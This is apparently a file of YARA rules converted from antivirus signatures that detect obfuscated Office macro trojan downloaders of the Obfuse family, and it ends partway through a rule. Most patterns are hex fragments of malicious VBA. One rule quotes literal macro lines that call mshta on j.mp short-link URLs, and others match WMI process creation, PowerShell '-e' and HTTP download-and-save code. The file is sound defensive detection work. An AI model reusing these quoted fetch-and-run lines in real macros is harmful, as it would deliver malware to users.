rule TrojanDownloader_O97M_Obfuse_PA_2147730986_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PA"
        threat_id = "2147730986"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 72 72 61 79 28 [0-16] 2c 20 [0-16] 2c 20 [0-16] 2c 20 49 6e 74 65 72 61 63 74 69 6f 6e 2e 53 68 65 6c 6c 28 [0-16] 28 [0-16] 2e 54 65 78 74 42 6f 78 31 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PA_2147730986_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PA"
        threat_id = "2147730986"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = "Sub AutoClose()" ascii //weight: 1
        $x_2_3 = "Val(Application.MailSystem) Like Val(1)" ascii //weight: 2
        $x_2_4 = {53 65 74 20 [0-32] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 29}  //weight: 2, accuracy: Low
        $x_2_5 = {2e 52 75 6e 20 [0-16] 2c 20}  //weight: 2, accuracy: Low
        $x_2_6 = {24 70 61 74 68 [0-1] 27 3b 24 [0-16] 22}  //weight: 2, accuracy: Low
        $x_2_7 = {20 2d 53 63 6f 70 65 [0-32] 22}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((5 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_CA_2147731095_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.CA"
        threat_id = "2147731095"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 53 68 61 70 65 73 28 [0-32] 20 2b 20 [0-32] 20 2b 20 [0-32] 29 2e 54 65 78 74 46 72 61 6d 65}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 41 72 72 61 79 28 [0-16] 2c 20 [0-16] 2c 20 [0-16] 2c 20 53 68 65 6c 6c 28}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_CP_2147731893_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.CP"
        threat_id = "2147731893"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_1_1 = " = Mid(" ascii //weight: 1
        $x_1_2 = " = Chr(Asc(" ascii //weight: 1
        $x_1_3 = "Private Sub Workbook_Open()" ascii //weight: 1
        $x_1_4 = " = CreateObject(\"scripting.filesystemobject\")" ascii //weight: 1
        $x_1_5 = " = CreateObject(\"microsoft.xmlhttp\")" ascii //weight: 1
        $x_1_6 = " = CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_7 = ".Open \"GET\", " ascii //weight: 1
        $x_1_8 = ".Status = 200 Then" ascii //weight: 1
        $x_1_9 = " = CreateObject(\"adodb.stream\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_CP_2147731893_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.CP"
        threat_id = "2147731893"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub autoopen()" ascii //weight: 1
        $x_1_2 = "~9,2% /V" ascii //weight: 1
        $x_1_3 = "~9,2% \" + \"/V:" ascii //weight: 1
        $x_1_4 = "\",2% /V:O\" +" ascii //weight: 1
        $x_1_5 = "+ \"9,2% /V:O\"" ascii //weight: 1
        $x_1_6 = "~9,2% /\" + \"V" ascii //weight: 1
        $x_1_7 = "\"9,2% /V" ascii //weight: 1
        $x_1_8 = "9,2%\"" ascii //weight: 1
        $x_1_9 = "\"9,2% \" +" ascii //weight: 1
        $x_1_10 = "~9\" + \",2%" ascii //weight: 1
        $x_1_11 = "~9,\" + \"2%" ascii //weight: 1
        $x_1_12 = "\",2%\" + \" /V" ascii //weight: 1
        $x_1_13 = "\"9,2%\"" ascii //weight: 1
        $x_1_14 = {46 69 78 28 07 00 29}  //weight: 1, accuracy: Low
        $x_10_15 = {3d 20 53 68 65 6c 6c 28 [0-128] 2c 20 07 00 20 2d 20 07 00 29}  //weight: 10, accuracy: Low
        $x_10_16 = {3d 20 53 68 65 6c 6c 28 [0-32] 20 2b 20 [0-32] 20 2b 20 [0-32] 2c 20 76 62 48 69 64 65 29}  //weight: 10, accuracy: Low
        $x_10_17 = {3d 20 43 68 6f 6f 73 65 28 [0-64] 2c 20 53 68 65 6c 6c 28 [0-112] 2c 20 07 00 20 2d 20 07 00 29}  //weight: 10, accuracy: Low
        $x_10_18 = {53 68 65 6c 6c 20 22 22 20 2b 20 [0-128] 2c 20}  //weight: 10, accuracy: Low
        $x_1_19 = {3d 20 48 65 78 28 [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_20 = {48 65 78 28 [0-16] 20 2a}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((12 of ($x_1_*))) or
            ((1 of ($x_10_*) and 2 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_CW_2147733263_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.CW"
        threat_id = "2147733263"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub autoopen()" ascii //weight: 1
        $x_1_2 = {53 68 65 6c 6c 20 [0-112] 2c 20}  //weight: 1, accuracy: Low
        $x_1_3 = {43 68 72 28 4b 65 79 43 6f 64 65 43 6f 6e 73 74 61 6e 74 73 2e 76 62 4b 65 79 50 29 20 2b 20 [0-112] 2c 20 07 00 20 2d 20 07 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_CU_2147733273_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.CU"
        threat_id = "2147733273"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 77 28 [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {44 69 6d 20 [0-16] 28 29 20 41 73 20 42 79 74 65}  //weight: 1, accuracy: Low
        $x_1_3 = "= \"shell.exe \"" ascii //weight: 1
        $x_1_4 = {53 68 65 6c 6c 20 [0-16] 28 29 20 5f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_CV_2147733299_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.CV"
        threat_id = "2147733299"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "13"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 77 28 [0-16] 29}  //weight: 1, accuracy: Low
        $x_10_2 = "= \"SHE\" & \"LL \"" ascii //weight: 10
        $x_1_3 = {43 61 6c 6c 20 [0-16] 28 [0-16] 20 26}  //weight: 1, accuracy: Low
        $x_1_4 = "= \"ow\"" ascii //weight: 1
        $x_1_5 = {44 69 6d 20 [0-16] 28 03 00 20 54 6f 20 03 00 29 20 41 73 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_CT_2147733304_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.CT"
        threat_id = "2147733304"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "21"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = "Sub love(" ascii //weight: 10
        $x_10_2 = {43 61 6c 6c 20 53 68 65 6c 6c 28 [0-16] 28 31 29 20 26 20 [0-16] 20 26 20 [0-16] 20 26 20 [0-16] 2c 20 30 29}  //weight: 10, accuracy: Low
        $x_1_3 = {3d 20 4d 69 64 28 [0-16] 2c 20 [0-16] 2c 20 2d 04 00 20 2b 20 04 00 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 53 67 6e 28 [0-7] 29}  //weight: 1, accuracy: Low
        $x_1_5 = "= Sgn(0)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_10_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_CY_2147733358_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.CY"
        threat_id = "2147733358"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub autoopen()" ascii //weight: 1
        $x_1_2 = {53 68 65 6c 6c 20 [0-112] 2c 20}  //weight: 1, accuracy: Low
        $x_10_3 = {43 68 72 28 [0-32] 2b 20 4b 65 79 43 6f 64 65 43 6f 6e 73 74 61 6e 74 73 2e 76 62 4b 65 79 50 20 2b 20 [0-64] 29 20 2b 20 [0-128] 2c 20 07 00 20 2d 20 07 00}  //weight: 10, accuracy: Low
        $x_10_4 = {43 56 61 72 28 [0-80] 20 2b 20 4b 65 79 43 6f 64 65 43 6f 6e 73 74 61 6e 74 73 2e 76 62 4b 65 79 50 20 2b 20 [0-128] 29 20 2b 20 [0-144] 2c 20 07 00 20 2d 20 07 00}  //weight: 10, accuracy: Low
        $x_10_5 = {43 49 6e 74 28 [0-80] 20 2b 20 4b 65 79 43 6f 64 65 43 6f 6e 73 74 61 6e 74 73 2e 76 62 4b 65 79 50 20 2b 20 [0-112] 29 20 2b 20 [0-112] 29 20 2b 20 [0-128] 2c 20 07 00 20 2d 20 07 00}  //weight: 10, accuracy: Low
        $x_10_6 = {43 68 72 28 [0-64] 20 2b 20 43 53 74 72 28 [0-64] 20 2b 20 4b 65 79 43 6f 64 65 43 6f 6e 73 74 61 6e 74 73 2e 76 62 4b 65 79 50 20 2b 20 [0-64] 29 20 2b 20 [0-80] 29 20 2b 20 [0-128] 2c 20 07 00 20 2d 20 07 00}  //weight: 10, accuracy: Low
        $x_10_7 = {43 68 72 28 [0-64] 20 2b 20 4b 65 79 43 6f 64 65 43 6f 6e 73 74 61 6e 74 73 2e 76 62 4b 65 79 50 20 2b 20 [0-64] 29 20 2b 20 43 68 72 28 [0-64] 2b 20 4b 65 79 43 6f 64 65 43 6f 6e 73 74 61 6e 74 73 2e 76 62 4b 65 79 4f 20 2b 20 [0-64] 29}  //weight: 10, accuracy: Low
        $x_10_8 = {43 68 72 28 [0-32] 20 2b 20 [0-48] 20 2b 20 4b 65 79 43 6f 64 65 43 6f 6e 73 74 61 6e 74 73 [0-1] 2e 76 62 4b 65 79 50 20 2b 20 [0-64] 29 20 2b 20}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 2 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_CZ_2147733411_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.CZ"
        threat_id = "2147733411"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 28 [0-112] 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 49 6e 53 74 72 28 [0-32] 28 41 72 72 61 79 28}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 4c 54 72 69 6d 28 22 [0-32] 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DB_2147733507_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DB"
        threat_id = "2147733507"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub autoopen()" ascii //weight: 1
        $x_1_2 = "GetObject(\"winmgmts:Win32_Process\")" ascii //weight: 1
        $x_10_3 = {43 68 72 28 [0-32] 20 2b 20 [0-32] 20 2b 20 4b 65 79 43 6f 64 65 43 6f 6e 73 74 61 6e 74 73 40 2e 76 62 4b 65 79 50 20 2b 20 [0-64] 29 20 2b 20}  //weight: 10, accuracy: Low
        $x_10_4 = {43 44 62 6c 28 [0-16] 29 20 2b 20 [0-16] 20 2a 20 43 68 72 42 28 [0-16] 29 20 2a 20 28 [0-16] 20 2a 20 43 44 61 74 65 28 [0-16] 20 2a 20 52 6f 75 6e 64 28 [0-16] 20 2b 20 43 68 72 28 [0-16] 29 29 29 20 2b 20 [0-16] 20 2d 20 43 53 6e 67 28 [0-16] 20 2f 20 [0-16] 29 29 29 [0-16] 2e 53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 07 00 20 2d 20 07 00}  //weight: 10, accuracy: Low
        $x_10_5 = {2e 43 72 65 61 74 65 20 [0-16] 20 2b 20 [0-16] 20 2b 20 [0-16] 20 2b 20 [0-16] 20 2b 20 [0-16] 20 2b 20 [0-16] 20 2b 20 [0-16] 2c 20 [0-16] 2c 20 [0-16] 2c 20 70 72 6f 63 65 73 73 69 64}  //weight: 10, accuracy: Low
        $x_10_6 = {2e 43 72 65 61 74 65 20 [0-96] 20 2b 20 [0-96] 2c 20 4e 75 6c 6c 2c 20 [0-16] 2c 20 70 72 6f 63 65 73 73 69 64}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 2 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_DC_2147733521_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DC"
        threat_id = "2147733521"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {53 68 61 70 65 73 28 22 [0-32] 22 29 2e 41 6c 74 65 72 6e 61 74 69 76 65 54 65 78 74}  //weight: 10, accuracy: Low
        $x_10_2 = {56 42 41 2e 49 6e 74 65 72 61 63 74 69 6f 6e 2e 53 68 65 6c 6c ?? 20 5f}  //weight: 10, accuracy: Low
        $x_1_3 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 68 61 70 65 73 28 [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 68 65 6c 6c 20 [0-32] 28 29 2c 20 4c 65 6e 28 [0-32] 28 29 29}  //weight: 1, accuracy: Low
        $x_1_5 = {53 68 65 6c 6c ?? 20 [0-32] 28 29 2c 20 4c 65 6e 28 [0-32] 28 29 29}  //weight: 1, accuracy: Low
        $x_1_6 = {53 68 65 6c 6c ?? 20 [0-16] 2c 20 76 62 48 69 64 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 1 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_2147733536_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse!MTB"
        threat_id = "2147733536"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell \"\"\"\" + \"ms\" + \"hta\"\"\"\"\" + \"https\" + \":\\\\j.mp\\gshjag\" + \"hjksaox\"\"\"" ascii //weight: 1
        $x_1_2 = "Shell \"\"\"\" + \"ms\" + \"hta\"\"\"\"\" + \"https:\\\\j.mp\\\" + \"sdahdnsan67vbz\"\"\"" ascii //weight: 1
        $x_1_3 = "Shell \"\"\"\" + \"msh\" + \"ta\"\"\"\"https:\\\\j.mp\\jhay2a\" + \"aabx\"\"\"" ascii //weight: 1
        $x_1_4 = "Shell \"\"\"ms\" + \"hta\"\"\"\"https:\\\\j.mp\\jap\" + \"262\" + \"vsv\" + \"xz\"\"\"" ascii //weight: 1
        $x_1_5 = "Shell \"\"\"\" + \"msh\" + \"ta\"\"\"\"https:\\\\j.mp\\jhasy2a\" + \"h23ax\"\"\"" ascii //weight: 1
        $x_1_6 = "Shell \"\"\"\" + \"ms\" + \"hta\"\"\"\"https:\\\\j.mp\\a1idna\" + \"andas7ox\"\"\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DD_2147733550_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DD"
        threat_id = "2147733550"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub autoopen()" ascii //weight: 1
        $x_1_2 = "GetObject(\"winmgmts:Win32_Process\")" ascii //weight: 1
        $x_1_3 = {2e 43 72 65 61 74 65 20 [0-48] 20 2b 20 [0-64] 2c 20 4e 75 6c 6c 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DD_2147733550_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DD"
        threat_id = "2147733550"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "22"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub autoopen()" ascii //weight: 1
        $x_1_2 = "= GetObject(\"winmgmts:Win32_Process\")" ascii //weight: 1
        $x_10_3 = {53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 07 00 20 2d 20 07 00}  //weight: 10, accuracy: Low
        $x_10_4 = {43 72 65 61 74 65 20 [0-32] 20 2b 20 [0-32] 20 2b 20 [0-32] 20 2b 20 [0-48] 2c 20 4e 75 6c 6c 2c 20 [0-16] 2c 20 70 72 6f 63 65 73 73 69 64}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DE_2147733557_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DE"
        threat_id = "2147733557"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub autoopen()" ascii //weight: 1
        $x_1_2 = "= GetObject(\"winmgmts:Win32_ProcessStartup\")" ascii //weight: 1
        $x_1_3 = {47 65 74 4f 62 6a 65 63 74 28 22 77 69 6e 6d 67 6d 74 73 3a 57 69 6e 33 32 5f 50 72 6f 63 65 73 73 22 20 2b 20 [0-48] 29 2e 43 72 65 61 74 65 20 [0-80] 2c 20 4e 75 6c 6c 2c 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DF_2147733564_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DF"
        threat_id = "2147733564"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 75 62 6c 69 63 20 46 75 6e 63 74 69 6f 6e 20 72 75 6e 28 [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 56 42 41 2e 53 68 65 6c 6c 28 [0-16] 2c 20 30 29}  //weight: 1, accuracy: Low
        $x_1_3 = "Call z" ascii //weight: 1
        $x_1_4 = "Sub Document_Close()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DG_2147733583_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DG"
        threat_id = "2147733583"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub autoopen()" ascii //weight: 1
        $x_1_2 = "= GetObject(\"winmgm\" + \"ts:Win\" + \"32_Proce\" + \"ssStartup\")" ascii //weight: 1
        $x_1_3 = "GetObject(\"winmg\" + \"mts:Wi\" + \"n32_Process\").Create" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DH_2147733598_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DH"
        threat_id = "2147733598"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub autoopen()" ascii //weight: 1
        $x_1_2 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-16] 20 2b 20 22 77 69 6e 6d 67 6d 22 20 2b 20 [0-16] 2b 20 22 74 73 3a 57 69 6e 22 20 2b 20 22 33 32 5f 50 72 6f 63 65 22 20 2b 20 22 73 73 53 74 61 72 74 75 70 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 28 [0-16] 20 2b 20 22 77 69 6e 6d 67 6d 22 20 2b 20 [0-16] 29 20 2b 20 28 [0-16] 20 2b 20 22 74 73 3a 57 69 6e 22 20 2b 20 [0-16] 29 20 2b 20 22 33 32 5f 50 72 6f 63 65 22 20 2b 20 22 73 73 53 74 61 72 74 75 70 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {47 65 74 4f 62 6a 65 63 74 28 [0-16] 20 2b 20 22 77 69 6e 6d 67 22 20 2b 20 22 6d 74 73 3a 57 69 22 20 2b 20 [0-16] 20 2b 20 22 6e 33 32 5f 50 72 6f 63 65 73 73 22 29 2e 43 72 65 61 74 65 20}  //weight: 1, accuracy: Low
        $x_1_5 = {47 65 74 4f 62 6a 65 63 74 28 28 [0-16] 20 2b 20 22 77 69 6e 6d 67 22 20 2b 20 22 6d 74 73 3a 57 69 22 20 2b 20 [0-16] 20 2b 20 22 6e 33 32 5f 50 72 6f 63 65 73 73 22 29 29 2e 43 72 65 61 74 65 20}  //weight: 1, accuracy: Low
        $x_1_6 = {47 65 74 4f 62 6a 65 63 74 28 28 [0-16] 20 2b 20 22 77 69 6e 6d 67 6d 74 73 3a 57 69 22 20 2b 20 [0-16] 20 2b 20 22 6e 33 32 5f 50 72 6f 63 65 73 73 22 29 29 2e 43 72 65 61 74 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DI_2147733633_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DI"
        threat_id = "2147733633"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub autoopen()" ascii //weight: 1
        $x_1_2 = {47 65 74 4f 62 6a 65 63 74 28 28 [0-16] 20 2b 20 22 77 69 6e 6d 67 6d 74 73 3a 57 69 22 20 2b 20 [0-16] 20 2b 20 22 6e 33 32 5f 50 72 6f 63 65 73 73 22 29 29 2e 43 72 65 61 74 65}  //weight: 1, accuracy: Low
        $x_1_3 = "= \"rsheLl\" + \" -e\" +" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DI_2147733633_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DI"
        threat_id = "2147733633"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub autoopen()" ascii //weight: 1
        $x_1_2 = {2b 20 22 77 69 6e 6d 67 6d 22 20 2b 20 [0-16] 29 20 2b 20 28 [0-16] 20 2b 20 22 74 73 3a 57 69 6e 22 20 2b 20 [0-16] 29 20 2b 20 22 33 32 5f 50 72 6f 63 65 22 20 2b 20 22 73 73 53 74 61 72 74 75 70 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 22 77 69 6e 22 20 2b 20 [0-16] 20 2b 20 22 6d 67 6d 22 20 2b 20 [0-16] 29 20 2b 20 28 [0-16] 20 2b 20 22 74 73 3a 57 69 6e 22 20 2b 20 [0-16] 29 20 2b 20 22 33 32 5f 50 72 6f 63 65 22 20 2b 20 22 73 73 53 74 61 72 74 75 70 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {22 77 69 6e 6d 67 6d 74 73 3a 57 69 22 20 2b 20 [0-16] 20 2b 20 22 6e 33 32 5f 50 72 6f 63 65 73 73 22 29 29 2e 43 72 65 61 74 65}  //weight: 1, accuracy: Low
